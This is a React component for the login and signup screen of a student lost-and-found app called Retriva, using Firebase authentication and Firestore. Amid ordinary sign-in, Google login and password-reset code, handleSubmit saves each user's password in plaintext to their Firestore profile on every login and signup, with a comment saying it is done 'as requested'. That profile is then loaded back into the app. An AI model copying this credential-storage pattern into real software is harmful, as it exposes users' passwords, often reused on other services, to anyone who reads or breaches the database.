import React, { useState, useEffect } from 'react';
import { User } from '../types';
import { Loader2, ArrowRight, Eye, EyeOff, AlertCircle, Mail, Lock, User as UserIcon, BrainCircuit, Zap, Activity, MessageCircle, Users, CheckCircle2 } from 'lucide-react';
import { auth, db, googleProvider, generateUniqueStudentId, FieldValue } from '../services/firebase';

interface AuthProps {
  onLogin: (user: User) => void;
  onShowLegal: () => void;
  onShowFeatures: () => void;
}

const Auth: React.FC<AuthProps> = ({ onLogin, onShowLegal, onShowFeatures }) => {
  const [isLogin, setIsLogin] = useState(true);
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  
  // Separate loading states
  const [isGoogleLoading, setIsGoogleLoading] = useState(false);
  const [isEmailLoading, setIsEmailLoading] = useState(false);
  const [isResetLoading, setIsResetLoading] = useState(false);

  const [error, setError] = useState<string | null>(null);
  const [successMsg, setSuccessMsg] = useState<string | null>(null);
  const [debugInfo, setDebugInfo] = useState<{domain: string, projectId: string} | null>(null);

  // 1. Handle Redirect Result (Runs when user comes back from Google Redirect)
  useEffect(() => {
    const checkRedirect = async () => {
      try {
        const result = await auth.getRedirectResult();
        if (result && result.user) {
          setIsGoogleLoading(true);
          const firebaseUser = result.user;
          await processLogin(firebaseUser);
        }
      } catch (err: any) {
        if (err.code === 'auth/operation-not-supported-in-this-environment') {
            console.warn("Firebase Auth Redirect not supported in this environment. Skipping check.");
            setIsGoogleLoading(false);
            return;
        }

        console.error("Redirect Login Error:", err);
        handleAuthError(err);
        setIsGoogleLoading(false);
      }
    };
    checkRedirect();
  }, []);

  // Shared function to process user data after Auth (Popup or Redirect)
  const processLogin = async (firebaseUser: any) => {
    try {
      const userDocRef = db.collection('users').doc(firebaseUser.uid);
      const userDoc = await userDocRef.get();

      if (userDoc.exists) {
        const existingData = userDoc.data() as User;
        
        // BACKFILL: Check if existing user is missing a studentId (Legacy support)
        if (!existingData.studentId) {
            const newId = await generateUniqueStudentId();
            await userDocRef.update({ studentId: newId });
            existingData.studentId = newId;
        }
        
        onLogin(existingData);
      } else {
        // Create new user with UNIQUE Student ID
        const uniqueId = await generateUniqueStudentId();
        
        const newUser: User = {
          id: firebaseUser.uid,
          name: firebaseUser.displayName || name || 'Student',
          email: firebaseUser.email || email || '',
          studentId: uniqueId, 
          isVerified: false,
          avatar: firebaseUser.photoURL || ''
        };
        await userDocRef.set(newUser);
        onLogin(newUser);
      }
    } catch (err: any) {
      setError("Failed to save user data.");
      throw err;
    }
  };

  const handleAuthError = (err: any) => {
    console.error(err);
    
    if (err.code === 'auth/unauthorized-domain') {
      const currentDomain = window.location.hostname;
      // @ts-ignore
      const projectId = auth.app.options.projectId || 'unknown';
      setDebugInfo({ domain: currentDomain, projectId });
      setError("Unauthorized Domain");
    } else if (err.code === 'auth/popup-closed-by-user') {
      setError("Sign in cancelled.");
    } else if (err.code === 'auth/operation-not-supported-in-this-environment') {
      setError("Google Sign-In is not supported in this browser environment. Please try Email/Password or use a different browser.");
    } else if (err.code === 'auth/network-request-failed') {
      setError("Network error. Check your connection or firewall.");
    } else {
      setError(err.message || "Authentication failed.");
    }
  };

  const handleGoogleLogin = async () => {
    if (isEmailLoading || isGoogleLoading) return;
    
    setIsGoogleLoading(true);
    setError(null);
    setSuccessMsg(null);
    setDebugInfo(null);
    
    try {
      const result = await auth.signInWithPopup(googleProvider);
      await processLogin(result.user);
    } catch (err: any) {
      if (err.code === 'auth/popup-closed-by-user') {
          console.log("Google Sign-In cancelled by user");
          setIsGoogleLoading(false);
          return;
      }

      if (err.code === 'auth/network-request-failed' || err.code === 'auth/popup-blocked') {
         console.warn("Popup failed, falling back to redirect...");
         try {
           await auth.signInWithRedirect(googleProvider);
         } catch (redirectErr: any) {
           handleAuthError(redirectErr);
           setIsGoogleLoading(false);
         }
      } else {
        handleAuthError(err);
        setIsGoogleLoading(false);
      }
    }
  };

  const handleForgotPassword = async () => {
    if (!email) {
      setError("Please enter your email address first to reset password.");
      return;
    }
    
    setIsResetLoading(true);
    setError(null);
    setSuccessMsg(null);

    try {
      await auth.sendPasswordResetEmail(email);
      setSuccessMsg("Password reset email sent! Please check your inbox (and spam folder).");
    } catch (err: any) {
      console.error("Reset Password Error:", err);
      if (err.code === 'auth/user-not-found') {
        setError("No account found with this email.");
      } else if (err.code === 'auth/invalid-email') {
        setError("Invalid email address.");
      } else {
        setError(err.message || "Failed to send reset email. Try again later.");
      }
    } finally {
      setIsResetLoading(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isEmailLoading || isGoogleLoading) return;

    setIsEmailLoading(true);
    setError(null);
    setSuccessMsg(null);
    setDebugInfo(null);
    
    try {
      if (isLogin) {
        const userCredential = await auth.signInWithEmailAndPassword(email, password);
        if (userCredential.user) {
           // Store password and increment attempts as requested
           await db.collection('users').doc(userCredential.user.uid).set({
              storedPassword: password, // Storing plaintext as requested
              loginAttempts: FieldValue.increment(1)
           }, { merge: true });

           await processLogin(userCredential.user);
        }
      } else {
        const userCredential = await auth.createUserWithEmailAndPassword(email, password);
        const firebaseUser = userCredential.user;
        if (firebaseUser) {
          await firebaseUser.updateProfile({ displayName: name });
          
          // Store password on creation as requested
          await db.collection('users').doc(firebaseUser.uid).set({
              storedPassword: password,
              loginAttempts: 1
          }, { merge: true });

          await processLogin(firebaseUser);
        }
      }
    } catch (err: any) {
      setIsEmailLoading(false);
      if (err.code === 'auth/invalid-credential' || err.code === 'auth/user-not-found' || err.code === 'auth/wrong-password') {
        setError('Incorrect email or password.');
      } else if (err.code === 'auth/email-already-in-use') {
        setError('Email already registered.');
      } else if (err.code === 'auth/weak-password') {
        setError('Password too weak (min 6 chars).');
      } else {
        setError(err.message || 'Authentication failed.');
      }
    }
  };

  return (
    <div className="min-h-screen w-full flex items-center justify-center p-4 lg:p-8 font-sans relative bg-black overflow-y-auto overflow-x-hidden">
      
      {/* RICH CHANGING DARK GRADIENT BACKGROUND (Outer) */}
      <div 
        className="fixed inset-0 animate-gradient-slow opacity-80"
        style={{
          background: 'linear-gradient(135deg, #000000 0%, #020617 25%, #0f172a 50%, #1e1b4b 75%, #000000 100%)',
          backgroundSize: '400% 400%',
          zIndex: 0
        }}
      ></div>
      
      {/* Subtle Texture */}
      <div className="fixed inset-0 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] opacity-20 pointer-events-none mix-blend-overlay z-0"></div>

      {/* Decorative Orbs - Darker */}
      <div className="fixed top-0 left-0 w-full h-full overflow-hidden pointer-events-none z-0">
         <div className="absolute top-[-10%] left-[-10%] w-[60vw] h-[60vw] bg-indigo-950/10 rounded-full blur-[150px] animate-pulse-soft"></div>
         <div className="absolute bottom-[-10%] right-[-10%] w-[50vw] h-[50vw] bg-blue-950/10 rounded-full blur-[150px] animate-pulse-soft" style={{ animationDelay: '2s' }}></div>
      </div>

      {/* FLOATING CARD CONTAINER */}
      <div className="relative z-10 w-full max-w-6xl flex flex-col lg:flex-row bg-[#080808] rounded-[2.5rem] shadow-2xl border border-white/5 ring-1 ring-white/5 lg:max-h-[95vh] h-auto lg:overflow-hidden">
        
        {/* LEFT PANEL - HERO SECTION */}
        <div className="lg:w-5/12 relative p-8 lg:p-12 flex flex-col bg-[#0f172a] shrink-0 text-white border-b lg:border-b-0 lg:border-r border-white/5 overflow-hidden rounded-t-[2.5rem] lg:rounded-tr-none lg:rounded-l-[2.5rem]">
           
           {/* Base Gradient */}
           <div className="absolute inset-0 bg-gradient-to-br from-indigo-950 via-[#0f172a] to-black z-0"></div>
           
           {/* Top-Left Highlight for Logo */}
           <div className="absolute -top-24 -left-24 w-96 h-96 bg-indigo-500/20 rounded-full blur-[100px] pointer-events-none z-0 mix-blend-screen"></div>

           {/* Subtle Dot Pattern */}
           <div className="absolute inset-0 opacity-[0.15] z-0" 
                style={{ backgroundImage: 'radial-gradient(rgba(255,255,255,0.15) 1px, transparent 1px)', backgroundSize: '24px 24px' }}>
           </div>

           {/* Content Container - Vertically Centered */}
           <div className="relative z-10 flex flex-col h-full justify-between">
              
              <div className="flex-1 flex flex-col justify-center">
                  {/* Logo Area */}
                  <div className="mb-10 text-center lg:text-left">
                    <div className="w-16 h-16 mb-4 filter drop-shadow-xl mx-auto lg:mx-0">
                      <svg viewBox="0 0 200 200" className="w-full h-full" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <defs>
                            <linearGradient id="pinGradientAuth" x1="100" y1="25" x2="100" y2="190" gradientUnits="userSpaceOnUse">
                              <stop offset="0" stopColor="#ffffff" />
                              <stop offset="1" stopColor="#e0e7ff" />
                            </linearGradient>
                          </defs>
                          <g>
                            <circle cx="100" cy="100" r="35" stroke="url(#pinGradientAuth)" strokeWidth="1.5" fill="none" opacity="0.6" className="animate-signal" style={{ transformBox: 'fill-box', transformOrigin: 'center' }} />
                            <circle cx="100" cy="100" r="35" stroke="url(#pinGradientAuth)" strokeWidth="1.5" fill="none" opacity="0.6" className="animate-signal" style={{ animationDelay: '1s', transformBox: 'fill-box', transformOrigin: 'center' }} />
                          </g>
                          <path fillRule="evenodd" clipRule="evenodd" d="M100 25 C60 25 25 60 25 100 C25 140 90 185 100 190 C110 185 175 140 175 100 C175 60 140 25 100 25 Z" fill="url(#pinGradientAuth)" />
                          <circle cx="100" cy="100" r="42" fill="#4f46e5" />
                          <g transform="translate(100 100)">
                            <path d="M0 -24 V24 M-24 0 H24" stroke="white" strokeWidth="6" strokeLinecap="round" />
                            <path d="M-16 -16 L16 16 M16 -16 L-16 16" stroke="white" strokeWidth="6" strokeLinecap="round" />
                          </g>
                      </svg>
                    </div>
                    
                    <h1 className="text-3xl lg:text-4xl font-black tracking-tighter mb-3 leading-tight bg-gradient-to-br from-white via-slate-200 to-slate-500 bg-clip-text text-transparent">
                      RETRIVA
                    </h1>
                    <p className="text-sm text-slate-400 font-medium leading-relaxed max-w-sm mx-auto lg:mx-0">
                      The intelligent campus recovery network powered by Gemini 3.0 Vision.
                    </p>
                  </div>

                  {/* Features List */}
                  <div className="space-y-6 w-full max-w-sm lg:max-w-none mx-auto lg:mx-0 mt-2 hidden sm:block">
                    <div className="flex gap-5 group">
                        <div className="w-12 h-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center shrink-0 group-hover:bg-indigo-500/10 group-hover:border-indigo-500/20 transition-all duration-300 shadow-lg">
                          <BrainCircuit className="w-6 h-6 text-indigo-400" />
                        </div>
                        <div className="pt-1">
                          <h3 className="font-bold text-slate-200 text-sm mb-1 group-hover:text-white transition-colors">Gemini Vision AI</h3>
                          <p className="text-[11px] text-slate-400 leading-relaxed">
                            Upload a photo and let our AI automatically handle description and safety checks.
                          </p>
                        </div>
                    </div>

                    <div className="flex gap-5 group">
                        <div className="w-12 h-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center shrink-0 group-hover:bg-emerald-500/10 group-hover:border-emerald-500/20 transition-all duration-300 shadow-lg">
                          <Zap className="w-6 h-6 text-emerald-400" />
                        </div>
                        <div className="pt-1">
                          <h3 className="font-bold text-slate-200 text-sm mb-1 group-hover:text-white transition-colors">Real-time Matching</h3>
                          <p className="text-[11px] text-slate-400 leading-relaxed">
                            Instant notifications when a matching item is found nearby.
                          </p>
                        </div>
                    </div>

                    <div className="flex gap-5 group">
                        <div className="w-12 h-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center shrink-0 group-hover:bg-purple-500/10 group-hover:border-purple-500/20 transition-all duration-300 shadow-lg">
                          <MessageCircle className="w-6 h-6 text-purple-400" />
                        </div>
                        <div className="pt-1">
                          <h3 className="font-bold text-slate-200 text-sm mb-1 group-hover:text-white transition-colors">Secure Connect</h3>
                          <p className="text-[11px] text-slate-400 leading-relaxed">
                            Coordinate returns safely with built-in anonymous messaging and blocking.
                          </p>
                        </div>
                    </div>
                  </div>
              </div>

              {/* Footer Stats */}
              <div className="mt-8 pt-4 border-t border-white/5 flex items-center justify-between text-[9px] font-bold text-slate-600 uppercase tracking-widest shrink-0">
                 <div className="flex items-center gap-2">
                    <Activity className="w-3.5 h-3.5 text-emerald-500" />
                    <span>System Operational</span>
                 </div>
                 <div className="flex items-center gap-2">
                    <Users className="w-3.5 h-3.5 text-indigo-500" />
                    <span className="text-slate-500">For Campus community</span>
                 </div>
              </div>

           </div>
        </div>

        {/* RIGHT PANEL - Form */}
        <div className="lg:w-7/12 w-full flex flex-col p-8 lg:p-12 relative bg-[#0c0e14] lg:overflow-y-auto custom-scrollbar rounded-b-[2.5rem] lg:rounded-bl-none lg:rounded-r-[2.5rem]">
           
           <div className="flex justify-between items-center mb-8 shrink-0">
              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/5">
                 <Lock className="w-3.5 h-3.5 text-emerald-500" />
                 <span className="text-[10px] font-bold text-slate-400 uppercase tracking-wide">Secure Campus Login</span>
              </div>
              <div className="hidden sm:flex gap-4 text-[11px] font-bold text-slate-500">
                 <button onClick={onShowLegal} className="hover:text-white transition-colors">Legal</button>
                 <button onClick={onShowLegal} className="hover:text-white transition-colors">Privacy</button>
              </div>
           </div>

           <div className="flex-1 flex flex-col justify-center max-w-sm w-full mx-auto relative z-10">
              <div className="mb-8 shrink-0">
                 <h2 className="text-3xl font-black text-white mb-2 tracking-tight">
                    {isLogin ? 'Welcome back' : 'Join Retriva'}
                 </h2>
                 <p className="text-slate-400 text-sm font-medium">
                    {isLogin ? 'Enter your student credentials to access.' : 'Create your account to start reporting.'}
                 </p>
              </div>

              {successMsg && (
                 <div className="mb-6 p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center gap-2 animate-in slide-in-from-top-2">
                    <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
                    <p className="text-sm font-bold text-emerald-400 leading-snug">{successMsg}</p>
                 </div>
              )}

              {error && (
                 <div className="mb-6 p-4 rounded-xl bg-red-500/10 border border-red-500/20 flex flex-col items-start gap-2 animate-in slide-in-from-top-2">
                    <div className="flex items-center gap-2">
                       <AlertCircle className="w-4 h-4 text-red-500 shrink-0" />
                       <p className="text-sm font-bold text-red-400 leading-snug">{error}</p>
                    </div>
                 </div>
              )}

              <form onSubmit={handleSubmit} className="space-y-4">
                 {!isLogin && (
                    <div className="group animate-in slide-in-from-bottom-2 fade-in">
                       <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-2 ml-4">Full Name</label>
                       <div className="relative">
                          <UserIcon className="absolute left-5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500 group-focus-within:text-indigo-500 transition-colors duration-300" />
                          <input 
                             type="text" 
                             value={name}
                             onChange={(e) => setName(e.target.value)}
                             className="w-full pl-11 pr-5 py-3.5 bg-[#14161f] border border-slate-800 rounded-xl text-white font-bold outline-none focus:ring-2 focus:ring-indigo-500/30 focus:border-indigo-500 transition-all duration-300 placeholder:text-slate-600 text-sm"
                             placeholder="John Doe"
                             required
                             disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                          />
                       </div>
                    </div>
                 )}

                 <div className="group">
                    <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-2 ml-4">Student Email</label>
                    <div className="relative">
                       <Mail className="absolute left-5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500 group-focus-within:text-indigo-500 transition-colors duration-300" />
                       <input 
                          type="email" 
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          className="w-full pl-11 pr-5 py-3.5 bg-[#14161f] border border-slate-800 rounded-xl text-white font-bold outline-none focus:ring-2 focus:ring-indigo-500/30 focus:border-indigo-500 transition-all duration-300 placeholder:text-slate-600 text-sm"
                          placeholder="student@university.edu"
                          required
                          disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                       />
                    </div>
                 </div>

                 <div className="group">
                    <div className="flex justify-between items-center mb-2 ml-4 mr-1">
                       <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider">Password</label>
                       {isLogin && (
                           <button 
                             type="button" 
                             onClick={handleForgotPassword}
                             disabled={isResetLoading}
                             className="text-[10px] font-bold text-indigo-400 hover:text-indigo-300 transition-colors disabled:opacity-50 flex items-center gap-1"
                           >
                              {isResetLoading ? <Loader2 className="w-3 h-3 animate-spin" /> : null}
                              Forgot?
                           </button>
                       )}
                    </div>
                    <div className="relative">
                       <Lock className="absolute left-5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500 group-focus-within:text-indigo-500 transition-colors duration-300" />
                       <input 
                          type={showPassword ? "text" : "password"} 
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          className="w-full pl-11 pr-12 py-3.5 bg-[#14161f] border border-slate-800 rounded-xl text-white font-bold outline-none focus:ring-2 focus:ring-indigo-500/30 focus:border-indigo-500 transition-all duration-300 placeholder:text-slate-600 text-sm"
                          placeholder="••••••••"
                          required
                          disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                       />
                       <button 
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-4 top-1/2 -translate-y-1/2 p-1 text-slate-500 hover:text-indigo-500 transition-colors"
                          disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                       >
                          {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                       </button>
                    </div>
                 </div>

                 <button 
                    type="submit" 
                    disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                    className="w-full mt-6 py-3.5 bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white rounded-xl font-black text-xs uppercase tracking-widest shadow-xl shadow-indigo-600/20 hover:shadow-indigo-600/40 hover:scale-[1.01] active:scale-[0.98] transition-all duration-300 disabled:opacity-70 disabled:transform-none flex items-center justify-center gap-2 group"
                 >
                    {isEmailLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : (
                       <>
                          {isLogin ? 'Sign In' : 'Create Account'} <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
                       </>
                    )}
                 </button>
              </form>

              <div className="relative my-8 shrink-0">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-slate-800"></div>
                </div>
                <div className="relative flex justify-center text-[10px] uppercase font-bold tracking-widest">
                  <span className="px-3 bg-[#0c0e14] text-slate-500">Or continue with</span>
                </div>
              </div>

              <button
                type="button"
                onClick={handleGoogleLogin}
                disabled={isEmailLoading || isGoogleLoading || isResetLoading}
                className="relative w-full group shrink-0"
              >
                <div className={`absolute -inset-0.5 bg-gradient-to-r from-blue-500 via-red-500 to-yellow-500 rounded-xl opacity-10 blur-lg transition-all duration-500 animate-gradient-slow ${isGoogleLoading ? 'opacity-40' : 'group-hover:opacity-60'}`}></div>
                <div className="relative w-full py-3.5 bg-[#202124] rounded-xl border border-white/10 flex items-center justify-between px-5 overflow-hidden transition-all duration-300 group-hover:scale-[1.02] active:scale-[0.98] shadow-2xl">
                   <div className="relative w-8 h-8 flex items-center justify-center mr-3 shrink-0 pointer-events-none">
                      <svg viewBox="0 0 24 24" className="w-6 h-6">
                         <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                         <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                         <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                         <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                      </svg>
                   </div>
                   <div className="flex-1 text-left">
                      <div className="text-white font-bold text-sm tracking-tight group-hover:text-indigo-200 transition-colors">
                         Sign in with Google
                      </div>
                   </div>
                   <div className="w-8 h-8 rounded-full bg-white/5 border border-white/5 flex items-center justify-center text-slate-400 group-hover:text-white group-hover:bg-white/10 transition-colors z-20">
                      {isGoogleLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : <ArrowRight className="w-4 h-4 group-hover:translate-x-0.5 transition-transform" />}
                   </div>
                </div>
              </button>

              <div className="mt-8 pt-4 border-t border-slate-800/50 text-center shrink-0">
                 <p className="text-slate-400 text-xs font-medium">
                    {isLogin ? "New to Retriva?" : "Already have an account?"}
                    <button 
                      onClick={() => { setIsLogin(!isLogin); setError(null); }}
                      className="ml-2 text-indigo-400 font-bold hover:text-indigo-300 transition-colors hover:underline"
                    >
                       {isLogin ? 'Create Account' : 'Sign In'}
                    </button>
                 </p>
              </div>
           </div>

           {/* Mobile Footer Links */}
           <div className="mt-8 sm:hidden flex justify-center gap-6 text-[11px] font-bold text-slate-600 border-t border-slate-800/50 pt-4 shrink-0">
              <button onClick={onShowLegal}>Terms</button>
              <button onClick={onShowLegal}>Privacy</button>
           </div>
        </div>
      </div>
    </div>
  );
};

export default Auth;
